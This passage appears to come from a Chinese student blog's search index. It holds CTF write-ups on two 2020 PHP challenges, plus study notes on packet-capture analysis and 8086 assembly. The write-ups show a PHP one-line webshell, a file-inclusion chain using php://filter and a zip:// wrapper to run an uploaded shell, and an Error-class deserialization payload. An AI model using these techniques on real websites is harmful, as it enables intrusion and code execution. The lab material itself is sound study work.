eval($_POST[123]);?&gt;);?&gt;//只要执行此文件就会自动生成shell.php文件内容为一句话木马\n\n注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接\n"},{"title":"[极客大挑战_2020]Roamphp2-Myblog","url":"/2025/06/06/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Roamphp2-Myblog/","content":"[极客大挑战_2020]Roamphp2-Myblog靶场进去发现是一个博客界面，我们尝试登录和注册都无果\n然后发现每个界面都有一个page传参，我们怀疑是文件包含，于是直接读取源码\n\n\n虽然我们无法直接读取index.php，但是不影响做题，应该只是一个简单的include代码，由于page参数中未带后缀于是猜测会自动加上.php，直接读取\n?page=php://filter/convert.base64-encode/resource=login\n\n通过这个方式我们可以拿到各个界面的源码\n//login.php&lt;?phprequire_once(&quot;secret.php&quot;);mt_srand($secret_seed);$_SESSION[&#x27;password&#x27;] = mt_rand();?&gt;//按照提示再读取secret.php//secret.php&lt;?php$secret_seed = mt_rand();?&gt;//没拿到什么有用的信息，我们也没办法拿到种子\n\n然后我们抓包发现用户名和密码传递到admin/user，我们尝试读取，发现好多于是选取部分代码\n&lt;?phperror_reporting(0);session_start();$logined = false;if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123;    if ($_POST[&#x27;username&#x27;] === &quot;Longlone&quot; and $_POST[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])&#123;  // No one knows my password, including myself        $logined = true;        $_SESSION[&#x27;status&#x27;] = $logined;    &#125;&#125;if ($logined === false &amp;&amp; !isset($_SESSION[&#x27;status&#x27;]) || $_SESSION[&#x27;status&#x27;] !== true)&#123;    echo &quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;;    die();&#125;?&gt;        &lt;?php        if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123;            $tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;];            $tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;];            if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123;                $allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;);                if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123;                    $upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension;                    move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name);                    echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;;                &#125; else &#123;                    echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \\&#x27;gif\\&#x27;, \\&#x27;jpeg\\&#x27;, \\&#x27;jpg\\&#x27;, \\&#x27;png\\&#x27; &#x27;) &lt;/script&gt;&quot;;                &#125;            &#125;        &#125;        ?&gt;\n\n我们进行代码审计发现用户名为Longlone，但是密码我们结合两个代码，发现是由随机数组成，但是我们无法拿到种子。看了大佬的wp后发现，我们只要删除我们传递的cookie，$_SESSION这个数组就会为空，于是我们只要将cookie删掉就能让SESSION数组变为空，我们密码也不传就行了\n\n\n我们把这里删除就可以将输入限制解除，然后再删掉所有cookie即可\n\n\n登录进去后发现这里可以上传文件，我们这个时候再来看文件上传的代码\n&lt;?php        if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123;            $tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;];            $tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;];            if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123;                $allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;);                if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123;                    $upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension;                    move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name);                    echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;;                &#125; else &#123;                    echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \\&#x27;gif\\&#x27;, \\&#x27;jpeg\\&#x27;, \\&#x27;jpg\\&#x27;, \\&#x27;png\\&#x27; &#x27;) &lt;/script&gt;&quot;;                &#125;            &#125;        &#125;        ?&gt;\n\n发现有白名单过滤，我们只能上传图片后缀\n但是，当文件上传和文件包含漏洞结合到一起的时候，就发现了一个很久没用过的zip伪协议\nzip伪协议可以将文件作为zip文件识别然后读取解压文件\n在PHP中，**zip:// 伪协议**允许你直接访问ZIP压缩包中的文件内容，而无需先解压到本地文件系统。它在CTF题目或实际开发中常用于读取ZIP内的特定文件（如配置文件、源码等），尤其在文件上传、LFI（本地文件包含）等场景中可能被利用。\nzip://&lt;zip文件路径&gt;#&lt;压缩包内文件路径&gt;\n\n\n&lt;zip文件路径&gt;：必须是本地文件系统路径（不支持HTTP远程ZIP）。\n# 后跟压缩包内文件的路径，且需要URL编码（例如空格变为%20）。\n\n我们先将一个shell的php文件压缩为zip，然后改后缀为jpg，进行文件上传，再用zip协议读取\n我之前尝试的时候发现好像shell中不能用短标签，卡了好久，以后还是用一些标识来看下文件读取成功了吗\n\n\n拿到文件路径\npayload\n?page=zip://./assets/img/upload/06f0d2b8d9f6c674a33c9727f17355944efb6cd5.jpg%231\n\n%23是#的url编码，后面的1则是我上传的zip中文1.php\n\n\n最后直接用这个url去蚁剑连接就行了\n这个题目不知道怎么回事，我上传了好久但是蚁剑一看只发现两个文件，这不会会清理文件吧\n"},{"title":"[极客大挑战_2020]Greatphp","url":"/2025/04/27/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-Greatphp/","content":"[极客大挑战_2020]Greatphp题目直接给源码\n&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123;    unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n\n看了源码，我以为是一个对md5和sha1加密函数的绕过，但是如果我们传入数组也没办法进行代码执行，自然反序列化结果也没有用。\n看来大佬的wp发现又是没学过的知识点，这次用到的是内置类触发__tostring方法，因为有些内置类__tostring方法返回的字符串是固定的，可以绕过加密函数\n我们这次用到的是Error()这个内置类，我们不需要了解太多，\nError 是 PHP 7 及以上版本中引入的内置错误处理类，它是所有内部 PHP 错误的基类，下面是其基础属性\nclass Error implements Throwable &#123;    /* 属性 */    protected string $message;    // 错误消息    protected int $code;         // 错误代码    protected string $file;      // 发生错误的文件    protected int $line;         // 发生错误的行号        /* 方法 */    public __construct(string $message = &quot;&quot;, int $code = 0, Throwable $previous = null)    final public getMessage(): string    final public getPrevious(): Throwable    final public getCode(): int    final public getFile(): string    final public getLine(): int    final public getTrace(): array    final public getTraceAsString(): string    public __toString(): string&#125;\n\n我们利用的就是传入不同的参数返回值不一样，但是触发tostring返回字符串一样\n\n\n我们继续看下触发tostring会返回什么\n\n\n我们发现除去我们不需要的报错信息，返回的都是\nError: aaaaa in D:\\Mei的编程\\CTF\\草稿1.php:2Stack trace:#0 &#123;main&#125;//第一个参数是返回代码用的，我们绕过第二个参数不一样也可以\n\n我们可以成功绕过加密函数\n剩下的就是进行代码执行了\n先贴一下大佬的payload\n&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c)));?&gt;\n\n我们重点需要关注的是这行代码和正则表达式\n$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match)\n\n我有点不明白的是为什么前面要加?&gt;，应该是要绕过waf或者闭合前面的标签\n至于后面的&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;则是短标签和进行取法绕过，取反结果为/flag这有效绕过了括号的过滤\n当触发tostring的时候会返回第一参数，也就是我们的命令执行\n\n\n没想到报错是爆我本地的错\n"},{"title":"流量分析","url":"/2025/10/02/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/","content":"流量分析做题总结不行啊，好歹是一个杂项手，但是杂项本来就杂，流量分析也是最难看懂的，总之就是收集那些特别离谱，根本没见过的流量，普通的流量分析就算了\nVoIP我们先来看下VoIP是什么东西\n\n\n也就是说这就是一个类似使用流量来传递语音，这也是我第一次使用wireshark的电话功能\n用wireshark打开流量包然后选择电话打开VoIP通话，然后打开唯一的一段音频\n\n\n可惜我的英语实在太差了，听不懂在说什么，但是其实只要把单个字符听到即可\nflag&#123;9001IVR&#125;\n\n\n\n\n\nNmap扫描端口题目来源[NewStarCTF 2023 公开赛道]Nmap，叫我们找出Nmap扫描出来的端口号，这个以前没做过，自己看流量包结果是错的，直接看题解\n题目描述为\n请给出Nmap扫描得到所有的开放端口用英文逗号分隔，端口号从小到大排列。 例如flag{21,22,80,8080}\n这个过滤器可以筛选出TCP端口开放的数据包\ntcp.flags.syn == 1 and tcp.flags.ack == 1\n\n也就是WireShark中那些绿色表示成功的流量\n\n\n然后就是UDP端口\nudp\n\n这个过滤条件可以筛选出UDP端口开放的数据包，该过滤条件会匹配所有的UDP数据包，因为UDP没有像TCP那样的连接建立过程，所以UDP数据包的到达通常表示端口是开放的。（UDP和TCP主要的区别就是，UDP不需要连接，可以直接发送包）\n这个题目没有UDP请求\nicmp and icmp.type == 3 and icmp.code == 3\n\n这个过滤条件用于查找被目标主机标记为”端口不可达”的数据包，通常表示端口关闭；\n该过滤条件匹配了ICMP “端口不可达”类型的数据包，其中的 “code” 值为3表示端口关闭。\n然后我们这个题目主要是查看TCP请求中开启的端口\n\n\n我们成功在TCP中看到端口，其他都是空的\n\n\n我们将这些端口从小排到大拿到flag\nflag&#123;80,3306,5000,7000,8021,9000&#125;\n\n\n\n\n\nTLS流量分析TLS流量太难理解了，还没学过计算机网络，这些东西太深奥了，现在只能学一下别人做题\nTLS流量基础\n\nTLS作用：用于加密应用层数据（如HTTP→HTTPS），保护通信隐私。\n常见来源：题目通常提供.pcap或.pcapng文件，包含TLS加密的流量。\n关键特征：在Wireshark中，默认显示为「TLSv1.2」、「TLSv1.3」协议，内容被加密。\n\nssc.key（服务器私钥）\n\n是什么：服务器的RSA私钥文件（通常是.pem或.key格式）\n作用：用于解密TLS握手阶段的Pre-Master Secret\n解密原理：在RSA密钥交换中，Client用服务器公钥加密Pre-Master Secret，只有持有私钥的服务器能解密\n文件内容：\n\n-----BEGIN PRIVATE KEY-----MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCwV6RmqeM...-----END PRIVATE KEY-----\n\n key.log（会话密钥日志）\n\n是什么：记录所有TLS会话的主密钥和流量密钥\n作用：直接提供解密所需的最终密钥，绕过复杂的密钥交换过程\n文件内容：\n\nCLIENT_RANDOM 5a5e5c7e3d9e4f2a8b1c6d3e7f8a9b0c 4f8a1b3c9d2e7f6a8b5c4d3e2f1a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b\n\n\n\nHTTP和TLS加密成为了HTTPS流量，所以TLS流量就是被加密的HTTP流量，这两个文件是我们解密TLS流量重要的两个文件，找到这两个文件都是可以直接将其进行解密的，只不过使用方法和过程不同\n使用方法都是\n编辑-&gt;首选项-&gt;Protocols-&gt;TLS\n\n\n\nssc.key是私钥，需要通过Wireshark进行解密\nssc.key → 需要Wireshark进行密码学计算 → 推导出会话密钥 → 解密数据\n\nkey.log则通过日志直接获取会话密钥可以直接解密\nkey.log → 直接提供会话密钥 → 立即解密数据\n\n然后这是具体的使用部位\n\n\n\n\n题目来源buuctf:greatescape\n看见很多TLS流量，然后其他流量没有发现什么特别的线索，猜测是TLS流量解密\n我们可以通过全局搜索.key来看下是否传递了key文件发现\n\n\n我们在下一个流中可以看到key文件\n\n\n由于这次私钥是直接明文传递我们可以直接全局搜索BEGIN PRIVATE KEY也可以找到，将其复制出来保存为ssc.key，然后再去配置好即可\n\n\n应用后就是追踪tcp.stream eq 80然后再对其流量包追踪HTTP流即可拿到flag，不知道是不是应为flag被写为字段了导致全局搜索不到，那样就只能自己去看流量包了\n\n\n\n\n\n\n\n\nUSB流量USB流量指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。\n键盘流量\nUSB协议数据部分在Leftover Capture Data域中，数据长度为八个字节。其中键盘击键信息集中在第三个字节中。\n\n\n如图，发现击键信息为0x06，即对应的按键为C\n这个用来传递按键信息的数据就是hid码，对于Hid码官方是有文档规定的\n键位映射关系参考：《USB键盘协议中键码》中的HID Usage ID\n然后注意，HID码只是绑定按键，不会绑定输入，也就是如果按键布局和正常的不同，相同输入的情况下的hid码也会和正常的不同，有些题目就会改变按键映射来让我们的一些工具失效\n对于hid码我们需要使用wireshark安装目录下的teshark去进行提取\ntshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txttshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\\s*$/d&#x27; &gt; usbdata.txt #提取并去除空行\n\n\n-T fields\n-T 选项用于设置输出格式。\nfields 表示输出将不是标准的数据包摘要，而是特定字段的值。这允许你精确提取你想要的某一部分数据。\n\n\n-e usbhid.data\n-e 选项代表 field to print（要打印的字段）。\nusbhid.data 是这个字段的名字，它特指从 USB HID设备 捕获到的数据载荷。\n简单来说，这个部分就是在告诉tshark：“我不要看数据包的IP地址、端口、时间戳这些杂七杂八的东西，我只要看HID设备传输的核心数据内容。”\n\n\n\n"},{"title":"汇编语言","url":"/2025/11/13/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","content":"汇编语言入门笔记本来真的不想学汇编的，但是考试要考，还考的贼难，或者说是汇编太难了，看了半天怎么输出个Hello World都这么麻烦。\n更加麻烦的是不同的CPU汇编方式还会不一样，所以我到现在都不是特别了解汇编语言到底是什么东西。主要理解就是，汇编语言有不同的风格，其中使用到的语法和结构也会不相同，但是其中最后都是需要将汇编语言通过编译器来编译为机器语言才能运行\n面对我们接触过的语言中主要分为编译语言和解释语言两种\n编译型语言：c&#x2F;c++…\n将代码源文件（xxx.c）经过编译器翻译之后生成可被机器执行的目标文件（机器语言），修改了源文件则需\n重新编译生成新的目标文件。\n解释型语言：python、php…\n类似于生活中的“同声翻译”，将源程序一边经过对应语言的解释器翻译成机器语言，一边执行，执行效率\n较低，不能生成可独立执行的目标文件，且其执行依赖于解释器。\n混合型语言：java\njava语言比较特殊，属于混合型语言（半编译半解释）就是先将Java文件编译为Class文件然后再运行\n然后我书上和网上的教程都是学的8086CPU，其架构为X86也就是我们常说的32位和16位这些，然后PC端使用的基本上都是X86架构，X86架构的一个特性就是可以向后兼容，也就是说在64位的PC上运行32位和16位的程序都是可以运行的\n还有就是除了X86以外还有其他的CPU架构，不同的架构之间对机器语言的理解是不同的，其实也就是CPU在不同架构中的运行原理有不同，也就是说不同架构之间的因为CPU运行的不同导致汇编语言的语法也是不同的，这也就是为什么在PC端运行的exe文件到移动端就不能运行了，难怪为什么还会有一个移动端开发，原来是PC端的软件根本就不能直接在移动端运行\n\n\n\n架构\n设计目标\n应用场景\n\n\n\nx86\n向后兼容，高性能\n个人电脑、服务器\n\n\nARM\n低功耗，高效率\n手机、平板、嵌入式\n\n\nRISC-V\n开源，可定制\n物联网、学术研究\n\n\nMIPS\n简洁，易于教学\n网络设备、教学\n\n\n然后我使用的和书上教的都是DOS汇编风格，然后使用的是MASM进行编译。\n1.寄存器这个是第一次遇见的一个概念，也是汇编语言的核心之一\n1.寄存器的概念一个典型的CPU由运算器、控制器、寄存器等器件组成 ，这些器件靠内部总线相连，内部总线实现CPU\n内部各个器件之间的联系，而CPU与外设（主板上的其他器件）之间的联系则由外部总线连接。\n简单来说，在CPU中：\n1）：运算器进行信息处理；\n2）：寄存器进行信息存储；\n3）：控制器控制各种器件进行工作；\n4）：内部总线连接各种器件，在他们之间进行数据的传送；\n下图为cpu组成：\n\n\n从上述描述中我们可以看出寄存器可以用来存储指令和数据。对于一个汇编程序员来说，CPU的主要部件是寄存器。寄存器是CPU中程序可以用指令读写的器件。程序员通过改变各种寄存器中内容来实现对CPU的控制。\n不同的CPU，寄存器的个数、结构是不同的。8086CPU由14个寄存器，每个寄存器有一个名称。这些寄存器\n是：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。这些寄存器有着不同的功能，在\n不同的场合扮演着不同的角色。后续的讲解中我们将逐渐接触到这些寄存器，这里我们就不一一介绍。\n这里我们先介绍一些通用寄存器：AX、BX、CX、DX\n8086CPU所有寄存器都是16位的，可以存放两个字节，上述4个寄存器通常用来存放一般性的数据，被称为\n通用寄存器。以AX为例，寄存器的逻辑结构如下图\n\n\n一个16位寄存器可以存储一个16位的数据，例如如果AX中存储的是32这个数值，存放结果如下图所示：\n\n\n而8086CPU为了兼容上一代CPU中的寄存器（上一代CPU中的寄存器位8位），上述这些寄存器又可以分为\n两个可独立使用的8位寄存器来用：AX可以分为AH、AL，同理，BX又可以分为BH、BL，CX可以分为CH、CL，DX可以分为DH、DL（H位high，L为low），以AX为例，它拆分成两个独立的8位寄存器表示如下：\n\n\nAX的低8bits构成了AL寄存器，高8bit构成了AH寄存器，AH和AL都是可以独立使用的寄存器。\n然后我们需要了解一下，寄存器的本质上各种寄存器全部都是储存一个16位数据，寄存器的主要作用不是用来单纯的储存数据，比如通用寄存器来进行一些数据传输（有一些特殊的寄存器无法直接写入），和进行一些算数运算。其他的一些寄存器比如段寄存器，其实就是用来储存各个段的一个地址，指针寄存器则是用来储存一些比如代码运行的指针和栈的指针这些。\n然后最主要的问题就是寄存器不是主要用来储存数据的，而是储存一些在代码运行时的信息\n\n\n\n\n2.字的储存这个我感觉主要还是要了解我们的数据是如何在CPU中进行储存的。\n我们应该听过字节的概念，1字节等于8比特位，那么字和字节又有什么关联呢？1个字等于2个字节。\n比特记为bit，字节记为Byte，字记为word，所以有如下关系：\n1Byte &#x3D; 8bits，1word &#x3D; 2Bytes &#x3D; 16bits\n\n\n\n符号\n全称\n大小\n字节数\n范围\n主要用途\n\n\n\nDB\nDefine Byte\n8位\n1字节\n0-255 (无符号) -128~+127 (有符号)\n字符、小整数、标志位\n\n\nDW\nDefine Word\n16位\n2字节\n0-65535 (无符号) -32768~+32767 (有符号)\n整数、偏移地址、数组\n\n\nDD\nDefine Doubleword\n32位\n4字节\n0-4,294,967,295 (无符号) -2³¹~+2³¹-1 (有符号)\n大整数、远指针、单精度浮点数\n\n\nDQ\nDefine Quadword\n64位\n8字节\n极大整数范围\n64位整数、双精度浮点数\n\n\nDT\nDefine Tenbytes\n80位\n10字节\n-\nBCD数、扩展精度浮点数\n\n\n而8086CPU出于兼容性的考虑，一次性可以处理两种尺寸的数据：字节以及字数据\n一个寄存器可以存储一个字数据，例如数据2000，其二进制数值为：0000 0111 1101 0000，储存格式如下：\n\n\n这样就是2000在寄存器中的存储格式（以AX为例），在AH中储存了它的高八位，AL存储了它的低八位。\nAH和AL中的数据可以看成一个整体是数值为2000，又可以看成是两个独立的数据，分别是7和208。\n上述是从寄存器出发，描述了一个16位数据在寄存器中的存储格式，而我们在使用汇编的过程中还会操作内存，那么在内存中一个字又可以用怎么样的格式体现呢？\n我们要知道内存单元是字节单元也就是说一个字节单元对应一个内存单元，当我们要保存一个子数据时，\n我们应该用两个地址连续的内存单元来保存。数据的低字节存放在低地址单元中，高字节存放在高地址\n单元中，假设我们从0地址开始存放2000，情况如下：\n\n\n我们用0、1两个内存单元存放数据2000（07D0H）。0、1两个单元用来储存一个字，这两个单元可以看成一个起始地址为0的字单元，对于这个字单元来说，0是低地址单元，1是高地址单元。07H被存放在高地址单元，而D0H被存放在低地址单元。同理，我们也可以把2，3看成一个字单元。\n在这里有一个新的概念：字单元，用来描述一种用来存储字型数据的内存单元。\n我们需要注意的是往内存中写入AX寄存器的时候先存储低位再储存高位字节，然后一个字等于两个字节单元\n3.物理地址与段地址CPU在访问内存单元之前，应该要给出内存单元的地址。所有的内存单元构成的存储的空间是一个一维的线性空间，每一个内存单元在这个空间中都有一个唯一的地址，我们称之为物理地址。\n那么8086CPU又是如何形成这些物理地址的呢？\n我们案例中的8086CPU是16位机，这种CPU具备如下特性：\n1）：一次最多可以处理16位的数据；\n2）：寄存器的最大宽度是16位；\n3）：寄存器和运算器之间的通路为16位；\n也就是说，8086CPU内部一次性能处理的数据长度最大为16位。内存单元的地址在送上地址总线之前还需要经过寄存器进行处理，也就是说16位CPU，能一次性处理16位的地址。\n但是8086CPU的地址总线是20位，也就是说8086CPU可以传送20位地址，这与上述说法相悖，那这又是为什么呢？\n8086CPU在内部有一个地址加法器可以将两个16位地址合成一个20位物理地址，示意图如下：\n\n\n当CPU要操作内存时，内部有如下事件发生：\n1）：CPU中的相关部件提供了两个16位地址，一个称为段地址，一个称为偏移地址；\n2）：段地址和偏移地址经过内部总线送入地址加法器；\n3）：地址加法器将两个16位地址合成一个20位的物理地址；\n4）：地址加法器将20位的物理地址通过内部总线送入输入输出控制电路；\n5）：输入输出控制电路将20位地址送入地址总线\n6）：20位物理地址被地址总线送到存储器\n地址加法器采用物理地址&#x3D;段地址*16+偏移地址的方法来合成物理地址，这样一个16位机就可以访问20位\n地址，寻址能力也从64KB扩大成1MB。\n16是2的4次方，乘16也就是再扩大4为2进制到20位，然后加上偏移地址后才是物理地址\n例如CPU要访问地址为123C8H的内存单元，地址加法器的工作过程为：\n\n\n4.段上节我们讲到“段地址”，那么段又是什么呢？段和段地址有什么关系呢？\n在中文中我们可以很好的理解段的含义：表示某个范围&#x2F;区间，也就是说“段地址”我们可以理解为一段地址\n更规范的说法是一块地址连续且起始地址为16倍数的存储单元定义为一个段。也就是说我们可以将内存进行分段处理，当然我们不要误解为内存本身就是一段一段的，这是一个错误的认知。内存本身是连续的，只不过8086CPU采用“物理地址&#x3D;段地址*16+偏移地址”来产生物理地址，我们可以通过分段的方式来管理内存。\n假设目前有两个段：10000H ~ 1007FH（段地址为1000H）、10080H ~ 100FFH，段地址为（1008H），两个段大小均为80H，其内存中分布示意如下：\n\n\n我认为段的起始地址为16的倍数的原因就是物理地址为段寄存器的地址中乘16再加上偏移地址，偏移地址是16位的，所以一个段的最大长度为64KB\n从上述描述中我们已经知道了什么是段了，在前面的讲述中我们说段地址是由CPU中的相关部件提供，那么\n这个相关部件是哪个呢？在众多的寄存器中的有4个段寄存器：CS，DS，SS，ES。当CPU要访问内存时，由他们提供段地址。这里我们看一下CS。\nCS和IP是8086CPU中最关键的两个寄存器。它们指示CPU当前要读取的指令的地址。CS称之为代码段寄存器，IP为指令指针寄存器。\n然后其他段寄存器的作用也是很关键的，比如DS存放的就是存放当前程序运行时储存数据的最低地址，也就是当前段的地址，相应的这些段寄存器都是可以更改的（除了CS）\n在8086CPU中，任意时刻设CS中的值为M，IP中的值为N，则CPU将从M*16+N地址单元中取出一条指令，然后会根据读取到的指令然后读取对应的字节为完整指令\n并执行。也就是说，当前执行的指令在哪由CS和IP来决定。可以表示为CS:IP。下图为CPU通过CS、IP寄存器\n进行指令操作：\n\n\n\n\n5.段的分类我们之前已经对段有了一个基本的认识了，但是各个不同的段有着不同的作用，不同的段寄存器也就是为了实现这个而存在的\n虽然我们可以将上述代码设置在一个代码段内，但是这仅仅我们编程时的一种安排，CPU并不会因为这种安排，就自动的将我们定义的代码段中的指令当做指令来执行。CPU只认被CS:IP指向的内存单元中的内容为指令。所以，要让CPU执行我们设置为代码段中指令，我们需要改变CS:IP指向的内容，换而言之，需要将CS:IP指向123B0这个单元。也就是说需要设置CS&#x3D;123BH，IP&#x3D;0000H。\n同样的，对于数据段来说，这仍然是我们编程时的一种安排，再具体操作的时候，我们需要将DS寄存器存放数据段的段地址，当我们在使用数据的时候只需要给出偏移地址就可以了，例如如下程序：\nmov ax,123BHmov ds,ax            ;将123BH送入ds中，作为数据段的段地址  （这里不能直接 mov ds,123BH）mov al,[0]           ;这句话的含义是将123B0:0000H单元中的内容存入al中\n\n我们代码中常见的有栈段，数据段，代码段等，其中数据段和代码段一般是由我们自己写的，然后再通过ASSUME语句将我们的段寄存器和各个段进行匹配\nCODE SEGMENT    ASSUME CS:CODE, DS:DATASTART:    mov ax, DATA    mov ds, ax           ; 设置 DS 指向数据段    mov ax, [data_value] ; 从数据段读取数据    call some_function    mov ah, 4ch    int 21hsome_function:    ; 纯代码，没有数据混杂    retCODE ENDSDATA SEGMENT    data_value dw 1234h  ; ✅ 安全：数据在独立段中DATA ENDS\n\n至于为什么我们不直接在代码中定义数据呢，那是因为如果指令和数据储存在同一个内存中就会导致数据和代码容易被修改导致程序错误\n; 错误示范：所有内容混在一起; （假设这里既有代码又有数据）main:    mov ax, [data_value]  ; 读取数据    call some_functiondata_value dw 1234h       ; ❌ 危险！数据在代码段中    ; 万一执行流程意外跳转到 data_value，CPU 会把数据 1234h 当成指令执行！some_function:    ; 函数代码...\n\n在这里我们就可以好好的认识一下这几个段寄存器了：CS，DS，SS，ES\n代码段寄存器（code segment）：CS\n存放当前正在运行的程序代码所在段的段基址，表示当前使用的指令代码可以从该段寄存器指定的存储器段中取得，相应的偏移地址则由IP（指令指针寄存器）提供；\n数据段寄存器（data segment）：DS\n指出当前程序使用的数据所存放段的最低地址，即存放数据段的段地址；\n栈段寄存器（stack segment）：SS\n指出当前堆栈的底部地址，即存放堆栈段的段基址。SS:SP指向栈顶单元。\n附加段数据寄存器（extra segment）：ES\n指出当前程序使用附加数据段的段基址，该段是串操作指令中目的串所在的段。\n6.标志寄存器标志寄存器是一个特殊的 16 位寄存器，在 8086&#x2F;8088 中它被称为 FLAGS 寄存器。\n然后这个寄存器中通过存放二进制数来，表示程序在运行时候的代码的各个状态，我们考试的话只需要了解重点的即可\n\n\n我们主要关注的是其中的 6 个核心状态标志，它们决定了条件跳转指令的行为。\n1.进位标志 CF\n\n功能：记录无符号数运算结果的最高有效位向更高位的进位值或借位值。\n设置规则：\n加法时，如果最高位产生进位，则 CF = 1；否则 CF = 0。\n减法时，如果最高位需要借位，则 CF = 1；否则 CF = 0。\n\n\n相关指令：JC (Jump if Carry), JNC (Jump if No Carry)\n示例：\n\nMOV AL, 0FFH  ; AL = 255ADD AL, 1     ; AL = 0, 结果产生进位 -&gt; CF = 1MOV BL, 0     ; BL = 0SUB BL, 1     ; BL = 255, 需要借位 -&gt; CF = 1\n\n\n\n2.零标志 ZF\n\n功能：记录运算结果是否为 0。\n设置规则：\n如果运算结果为 0，则 ZF = 1。\n如果运算结果不为 0，则 ZF = 0。\n\n\n相关指令：JZ (Jump if Zero), JNZ (Jump if Not Zero)\n示例：\n\nMOV AX, 10SUB AX, 10    ; 结果为 0 -&gt; ZF = 1MOV BL, 5DEC BL        ; 结果为 4 -&gt; 不为0 -&gt; ZF = 0\n\n\n\n3.符号标志 SF\n\n功能：记录运算结果的符号（对于有符号数而言）。\n设置规则：\n如果运算结果为负数（最高位为 1），则 SF = 1。\n如果运算结果为非负数（最高位为 0），则 SF = 0。\n\n\n相关指令：JS (Jump if Sign), JNS (Jump if No Sign)\n示例：\n\nMOV AL, 5SUB AL, 10    ; 结果为 -5 (二进制补码: 11111011) -&gt; 最高位是1 -&gt; SF = 1\n\n\n\n4.溢出标志 OF\n\n功能：记录有符号数运算结果是否发生了溢出。\n溢出：指运算结果超出了寄存器所能表示的有符号数的范围（8位：-128127；16位：-3276832767）。\n\n\n设置规则：\n如果发生溢出，则 OF = 1。\n否则 OF = 0。\n\n\n相关指令：JO (Jump if Overflow), JNO (Jump if No Overflow)\n示例：\n\nMOV AL, 127   ; 